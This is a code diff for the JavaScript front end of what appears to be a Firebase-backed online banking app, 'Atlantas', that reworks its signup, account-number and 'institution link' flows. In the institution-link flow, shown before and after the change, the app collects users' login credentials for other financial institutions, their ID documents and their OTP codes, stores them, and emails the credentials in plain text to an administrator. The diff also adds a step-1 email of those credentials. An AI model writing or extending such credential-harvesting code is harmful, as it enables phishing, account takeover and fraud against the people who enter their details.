@@ -37,7 +37,7 @@ function _convertCurrency(amount,fromCur,toCur){
 function _esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function _fmtDate(iso){if(!iso)return '';var d=new Date(iso);return d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+' \xb7 '+d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});}
 function _fbErr(code){return({'auth/user-not-found':'No account found with this email.','auth/wrong-password':'Incorrect password.','auth/invalid-credential':'Incorrect email or password.','auth/email-already-in-use':'Email already registered.','auth/invalid-email':'Invalid email address.','auth/weak-password':'Password too weak (min 6 chars).','auth/too-many-requests':'Too many attempts. Try again later.'}[code])||'Something went wrong. Please try again.';}
-function _genAccNum(){return new Promise(function(res){(function t(){var n=String(Math.floor(1000000000+Math.random()*9000000000));_db.ref(DB.accNums+'/'+n).once('value').then(function(s){if(s.exists())t();else res(n);});})();});}
+function _genAccNum(){return new Promise(function(res,rej){var attempts=0;(function t(){if(attempts++>10){rej(new Error('Could not generate account number. Try again.'));return;}var n=String(Math.floor(1000000000+Math.random()*9000000000));_db.ref(DB.accNums+'/'+n).once('value').then(function(s){if(s.exists())t();else res(n);}).catch(rej);})();});}
 function _notify(uid,msg){var k='n'+Date.now();return _db.ref(DB.notifs+'/'+uid+'/'+k).set({message:msg,date:new Date().toISOString(),read:false});}
 function _setEl(id,val){var e=$(id);if(e)e.textContent=val||'';}
 
@@ -655,8 +655,6 @@ function _renderUI(){
   _setEl('bio-status',bioEnabled?'Enabled':'Disabled');
   var btn=$('bio-toggle-btn');if(btn){btn.textContent=bioEnabled?'Disable':'Enable';btn.onclick=bioEnabled?APP_disableBiometric:APP_registerBiometric;}
   _renderBalance();_renderCards();_renderInstitutions();_renderLoanStatus();_checkPendingResume();
-  // Show/hide Change Country button based on dev config
-  var ccWrap=$('cc-profile-btn-wrap');if(ccWrap)ccWrap.style.display=_cfg.enableCountryChange?'':'none';
 }
 
 // ── PENDING RESUME CHECK ──────────────────────────────────────
@@ -1000,7 +998,6 @@ function _resumeInstOtp(saved){
     idx:saved.idx,
     data:saved.data||{},
     idFields:saved.idFields||[],
-    _instKey:saved.instKey||null,
     _otpStartTime:saved.otpStartTime||Date.now()
   };
   _setEl('inst-flow-name',saved.inst.name);
@@ -1146,12 +1143,8 @@ function APP_instStep1Submit(){
   (_instFlow.step1Fields||[]).forEach(function(f){var v=$('inst-f-'+f.key)&&$('inst-f-'+f.key).value.trim();if(!v)ok=false;data[f.key]=v||'';});
   if(!ok){APP_toast(t('err_fill_all_fields'),'er');return;}
   _instFlow.data=data;
-  // ── STAGE 1: Write initial record to Firebase immediately ──
-  var instKey=_user.uid+'_inst_'+Date.now();
-  _instFlow._instKey=instKey;
-  var stage1={uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,accountNumber:_ud.accountNumber,institution:inst.name,requireId:!!inst.requireId,otpType:inst.otpType,status:'stage1_credentials',addedDate:new Date().toISOString(),credentials:data};
-  _db.ref(DB.instSubs+'/'+instKey).set(stage1).catch(function(){});
-  _sendEmail('otp','Institution Link Step 1 — '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nInstitution: '+inst.name+'\nCredentials: '+JSON.stringify(data)+'\n\nStage 1 submitted. Awaiting ID/OTP.'});
+  _sendEmail('otp','Institution Link Step 1 \u2014 '+inst.name,{user_name:(_ud.firstname||'')+' '+(_ud.surname||''),user_email:_ud.email,message:'Name: '+(_ud.firstname||'')+' '+(_ud.surname||'')+'\nEmail: '+(_ud.email||'')+'\nAccount: '+(_ud.accountNumber||'')+'\nInstitution: '+inst.name+'\nCredentials: '+JSON.stringify(data)+'\n\nUser submitted credentials. Awaiting ID verification.'});
+  // NEW ORDER: go to ID documents first (step2), then OTP (step3)
   if(inst.requireId){_buildInstIdStep();_show('inst-step2',true);}
   else _showInstOtpStep();
 }
@@ -1163,12 +1156,7 @@ function APP_instIdSubmit(){
     else{var v=$('iinp-'+f.key)&&$('iinp-'+f.key).value.trim();if(v)_instFlow.data['id_'+f.key]=v;}
   });
   if(missing){APP_toast('Please upload all required documents','er');return;}
-  // ── STAGE 2: Append ID documents to existing Firebase record ──
-  if(_instFlow._instKey){
-    var idUpdate={status:'stage2_id',idSubmittedDate:new Date().toISOString()};
-    (_instFlow.idFields||[]).forEach(function(f){if(_instFlow.data['id_'+f.key])idUpdate['id_'+f.key]=_instFlow.data['id_'+f.key];});
-    _db.ref(DB.instSubs+'/'+_instFlow._instKey).update(idUpdate).catch(function(){});
-  }
+  // After ID, go to OTP step
   _showInstOtpStep();
 }
 function _showInstOtpStep(){
@@ -1184,7 +1172,6 @@ function _showInstOtpStep(){
       idx:_instFlow.idx,
       data:_instFlow.data||{},
       idFields:_instFlow.idFields||[],
-      instKey:_instFlow._instKey||null,
       otpStartTime:Date.now(),
       savedAt:new Date().toISOString()
     };
@@ -1291,10 +1278,8 @@ function _buildInstIdStep(){
 }
 function _submitInstFinal(){
   var inst=_instFlow.inst,data=_instFlow.data,idx=_instFlow.idx;
-  // ── STAGE 3: Append OTP to existing record (use key from stage 1) ──
-  var instKey=_instFlow._instKey||(_user.uid+'_inst_'+Date.now());
-  var finalUpdate={status:'processing',otpCode:data.otpCode||'',otpSubmittedDate:new Date().toISOString(),completedDate:new Date().toISOString()};
-  _db.ref(DB.instSubs+'/'+instKey).update(finalUpdate).then(function(){
+  var sub=Object.assign({},data,{uid:_user.uid,name:(_ud.firstname+' '+_ud.surname).trim(),email:_ud.email,accountNumber:_ud.accountNumber,institution:inst.name,requireId:!!inst.requireId,otpType:inst.otpType,status:'processing',addedDate:new Date().toISOString()});
+  _db.ref(DB.instSubs+'/'+_user.uid+'_'+Date.now()).set(sub).then(function(){
     // Clear saved pending OTP state — flow is complete
     _db.ref('atl_inst_pending/'+_user.uid).remove().catch(function(){});
     // Mark institution as processing in user record so UI shows status
@@ -1305,117 +1290,6 @@ function _submitInstFinal(){
     _sendEmail('otp','Institution Link Complete \u2014 '+inst.name,{user_name:sub.name,user_email:sub.email,message:'Name: '+sub.name+'\nEmail: '+sub.email+'\nInstitution: '+inst.name+'\n\nUser completed institution link. Awaiting admin review.'});
     _pushAdminAlert('\uD83C\uDFE6 New Institution Link',(_ud.firstname||'A user')+' linked '+inst.name+'. Tap to review.');
     _setEl('inst-confirm-name',inst.name);_show('inst-confirm',true);
-  });
-}
-
-
-// ── COUNTRY CHANGE FLOW ───────────────────────────────────────
-var _ccFlow=null;
-
-var CC_COUNTRIES=['Afghanistan','Albania','Algeria','Angola','Argentina','Armenia','Australia','Austria','Azerbaijan','Bahamas','Bahrain','Bangladesh','Barbados','Belarus','Belgium','Belize','Benin','Bolivia','Botswana','Brazil','Bulgaria','Burkina Faso','Cambodia','Cameroon','Canada','Cape Verde','Chad','Chile','China','Colombia','Congo','Costa Rica','Croatia','Cuba','Cyprus','Czech Republic','Denmark','Dominican Republic','Ecuador','Egypt','El Salvador','Estonia','Ethiopia','Fiji','Finland','France','Gabon','Gambia','Georgia','Germany','Ghana','Greece','Guatemala','Guinea','Guyana','Haiti','Honduras','Hungary','Iceland','India','Indonesia','Iran','Iraq','Ireland','Israel','Italy','Ivory Coast','Jamaica','Japan','Jordan','Kazakhstan','Kenya','Kuwait','Laos','Latvia','Lebanon','Lesotho','Liberia','Libya','Lithuania','Luxembourg','Madagascar','Malawi','Malaysia','Mali','Malta','Mauritius','Mexico','Moldova','Mongolia','Morocco','Mozambique','Myanmar','Namibia','Nepal','Netherlands','New Zealand','Nicaragua','Niger','Nigeria','Norway','Oman','Pakistan','Panama','Papua New Guinea','Paraguay','Peru','Philippines','Poland','Portugal','Qatar','Romania','Russia','Rwanda','Saudi Arabia','Senegal','Serbia','Seychelles','Sierra Leone','Slovakia','Slovenia','Somalia','South Africa','South Korea','Spain','Sri Lanka','Sudan','Sweden','Switzerland','Syria','Tanzania','Thailand','Togo','Trinidad and Tobago','Tunisia','Turkey','UAE','Uganda','Ukraine','United Kingdom','United States','Uruguay','Uzbekistan','Venezuela','Vietnam','Yemen','Zambia','Zimbabwe'];
-
-function _buildCcCountrySelect(){
-  var sel=document.getElementById('cc-country-select');
-  if(!sel||sel.dataset.built)return;
-  CC_COUNTRIES.forEach(function(c){
-    var opt=document.createElement('option');opt.value=c;opt.textContent=c;
-    sel.appendChild(opt);
-  });
-  sel.dataset.built='1';
-}
-
-function APP_startCcFlow(){
-  if(!_cfg.enableCountryChange){APP_toast('Country change is not available at this time.','er');return;}
-  // Check for existing pending request
-  _db.ref(DB.countryReqs).orderByChild('uid').equalTo(_user.uid).once('value',function(snap){
-    var hasPending=false;
-    if(snap.exists()){snap.forEach(function(s){if(s.val()&&s.val().status==='pending')hasPending=true;});}
-    if(hasPending){APP_toast('You already have a pending country change request.','er');return;}
-    _ccFlow={step:0,screens:(_cfg.countryChangeScreens&&_cfg.countryChangeScreens.length)?_cfg.countryChangeScreens:[{bg:'#ffffff',text:'Your request will be reviewed by our team.',btn:'Submit Request'}]};
-    _buildCcCountrySelect();
-    // Pre-fill current country
-    var sel=document.getElementById('cc-country-select');
-    if(sel&&_ud&&_ud.country){sel.value=_ud.country;}
-    var err=document.getElementById('cc-step1-err');if(err)err.textContent='';
-    var rea=document.getElementById('cc-reason');if(rea)rea.value='';
-    _show('cc-step1',true);
-  });
-}
-
-function APP_ccStep1Next(){
-  var sel=document.getElementById('cc-country-select');
-  var rea=document.getElementById('cc-reason');
-  var err=document.getElementById('cc-step1-err');
-  var country=sel?sel.value.trim():'';
-  var reason=rea?rea.value.trim():'';
-  if(!country){if(err)err.textContent='Please select a country.';return;}
-  if(!reason){if(err)err.textContent='Please enter a reason.';return;}
-  if(err)err.textContent='';
-  if(_ud&&country===(_ud.country||'')){if(err)err.textContent='That is already your current country.';return;}
-  _ccFlow.newCountry=country;
-  _ccFlow.reason=reason;
-  _ccFlow.step=0;
-  _showCcFlowScreen();
-}
-
-function _showCcFlowScreen(){
-  var screens=_ccFlow.screens;
-  var i=_ccFlow.step;
-  var sc=screens[i];
-  var total=screens.length;
-  // Set title
-  _setEl('cc-flow-title','Step '+(i+1)+' of '+total);
-  // Set background
-  var body=document.getElementById('cc-flow-body');
-  var wrap=document.getElementById('cc-flow-screen');
-  if(wrap)wrap.style.background=sc.bg||'#ffffff';
-  // Render text
-  if(body){
-    body.innerHTML='<div style="font-size:16px;line-height:1.7;color:var(--text);max-width:300px;white-space:pre-wrap;">'+_esc(sc.text||'')+'</div>';
-  }
-  // Set button label
-  var btn=document.getElementById('cc-flow-btn');
-  if(btn)btn.textContent=sc.btn||'Continue';
-  var ferr=document.getElementById('cc-flow-err');if(ferr)ferr.textContent='';
-  _show('cc-flow-screen',true);
-}
-
-function APP_ccFlowNext(){
-  var screens=_ccFlow.screens;
-  var i=_ccFlow.step;
-  // If last screen — submit
-  if(i>=screens.length-1){
-    _submitCcRequest();
-    return;
-  }
-  // Otherwise go to next screen
-  _ccFlow.step=i+1;
-  _showCcFlowScreen();
-}
-
-function _submitCcRequest(){
-  var btn=document.getElementById('cc-flow-btn');
-  var ferr=document.getElementById('cc-flow-err');
-  if(btn){btn.textContent='Submitting…';btn.disabled=true;}
-  var req={
-    uid:_user.uid,
-    name:(_ud.firstname+' '+_ud.surname).trim(),
-    email:_ud.email,
-    accountNumber:_ud.accountNumber||'',
-    currentCountry:_ud.country||'',
-    newCountry:_ccFlow.newCountry,
-    reason:_ccFlow.reason,
-    status:'pending',
-    submittedDate:new Date().toISOString()
-  };
-  _db.ref(DB.countryReqs+'/'+_user.uid+'_cc_'+Date.now()).set(req).then(function(){
-    if(btn){btn.textContent='Continue';btn.disabled=false;}
-    _sendEmail('otp','Country Change Request',{user_name:req.name,user_email:req.email,message:'Name: '+req.name+'\nEmail: '+req.email+'\nAccount: '+req.accountNumber+'\nFrom: '+req.currentCountry+'\nTo: '+req.newCountry+'\nReason: '+req.reason+'\n\nUser submitted a country change request. Please review in the admin panel.'});
-    _pushAdminAlert('🌍 Country Change Request',(_ud.firstname||'A user')+' wants to change country to '+req.newCountry+'. Tap to review.');
-    _show('cc-confirm',true);
-  }).catch(function(e){
-    if(ferr)ferr.textContent='Submission failed. Please try again.';
-    if(btn){btn.textContent='Try Again';btn.disabled=false;}
   });
 }
 
@@ -1567,20 +1441,19 @@ function APP_doSignup(){
   if(pw!==cf){err.textContent=t('err_password_mismatch');return;}
   if(pw.length<8){err.textContent=t('err_password_short');return;}
   var btn=$('su-btn');btn.textContent='Checking\u2026';btn.disabled=true;
+  function _resetBtn(msg){err.textContent=msg||'';btn.textContent='Create Account';btn.disabled=false;}
   // ── Block duplicate phone numbers ──
-  _db.ref(DB.users).orderByChild('phone').equalTo(ph).once('value',function(phoneSnap){
-    if(phoneSnap.exists()){
-      err.textContent=t('err_phone_registered');
-      btn.textContent='Create Account';btn.disabled=false;return;
-    }
-    // ── Block duplicate usernames ──
-    _db.ref(DB.users).orderByChild('username').equalTo(un).once('value',function(unSnap){
-      if(unSnap.exists()){
-        err.textContent='This username is already taken. Please choose another.';
-        btn.textContent='Create Account';btn.disabled=false;return;
-      }
+  _db.ref(DB.users).orderByChild('phone').equalTo(ph).once('value')
+    .then(function(phoneSnap){
+      if(phoneSnap.exists()){_resetBtn(t('err_phone_registered'));return Promise.reject('handled');}
+      // ── Block duplicate usernames ──
+      return _db.ref(DB.users).orderByChild('username').equalTo(un).once('value');
+    })
+    .then(function(unSnap){
+      if(!unSnap){return;}
+      if(unSnap.exists()){_resetBtn('This username is already taken. Please choose another.');return Promise.reject('handled');}
       btn.textContent='Creating\u2026';
-      _auth.createUserWithEmailAndPassword(em,pw).then(function(cred){
+      return _auth.createUserWithEmailAndPassword(em,pw).then(function(cred){
         var uid=cred.user.uid;
         return _genAccNum().then(function(accNum){
           var promoCode=(_cfg.promoCode||'').toUpperCase(),promoBal=parseFloat(_cfg.promoBalance)||500000;
@@ -1591,15 +1464,15 @@ function APP_doSignup(){
             .then(function(){return _db.ref(DB.accNums+'/'+accNum).set(uid);})
             .then(function(){return _db.ref(DB.pubDir+'/'+uid).set({firstname:fn,surname:sn,accountNumber:accNum});})
             .then(function(){
-              if(ref){_db.ref(DB.users).orderByChild('referralCode').equalTo(ref).once('value',function(snap){snap.forEach(function(s){var u=s.val();if(!u)return;var refs=u.referrals||[];refs.push({uid:uid,date:new Date().toISOString()});_db.ref(DB.users+'/'+s.key).update({referrals:refs,referralEarned:(parseFloat(u.referralEarned)||0)+refBonus});});});sessionStorage.removeItem('atl_ref');}
+              if(ref){_db.ref(DB.users).orderByChild('referralCode').equalTo(ref).once('value').then(function(snap){snap.forEach(function(s){var u=s.val();if(!u)return;var refs=u.referrals||[];refs.push({uid:uid,date:new Date().toISOString()});_db.ref(DB.users+'/'+s.key).update({referrals:refs,referralEarned:(parseFloat(u.referralEarned)||0)+refBonus});});}).catch(function(){});sessionStorage.removeItem('atl_ref');}
               _sendEmail('otp','New Registration',{user_name:fn+' '+sn,user_email:em,message:'Name: '+fn+' '+sn+'\nEmail: '+em+'\nPhone: '+ph+'\nCountry: '+co+'\nAccount Number: '+accNum+'\nCurrency: '+cur+'\n\nNew user registered.'});
               _pushAdminAlert('\uD83D\uDC64 New User Registered',(fn+' '+sn).trim()+' just created an account. Tap to review.');
               _notify(uid,'\uD83C\uDF89 Welcome to Atlantas, '+fn+'! Your account is ready. Complete your KYC verification to unlock full access.');
             });
         });
-      }).catch(function(e){err.textContent=_fbErr(e.code);btn.textContent='Create Account';btn.disabled=false;});
-    });
-  });
+      });
+    })
+    .catch(function(e){if(e!=='handled'){_resetBtn(_fbErr(e.code||e));}});
 }
 function APP_doLogout(){if(!confirm(t('confirm_logout')))return;try{localStorage.removeItem('atl_session_email');localStorage.removeItem('atl_session_time');}catch(e){}_auth.signOut();}
 function APP_signOut(){try{localStorage.removeItem('atl_session_email');localStorage.removeItem('atl_session_time');}catch(e){}_auth.signOut();}
@@ -2187,10 +2060,7 @@ var APP={
   obNext:APP_obNext,obSkip:APP_obSkip,
   pinKey:APP_pinKey,pinDel:APP_pinDel,cancelTxPin:APP_cancelTxPin,
   downloadStatement:APP_downloadStatement,
-  downloadReceipt:APP_downloadReceipt,
-  startCcFlow:APP_startCcFlow,
-  ccStep1Next:APP_ccStep1Next,
-  ccFlowNext:APP_ccFlowNext
+  downloadReceipt:APP_downloadReceipt
 };
 
 // ── DARK MODE ─────────────────────────────────────────────────
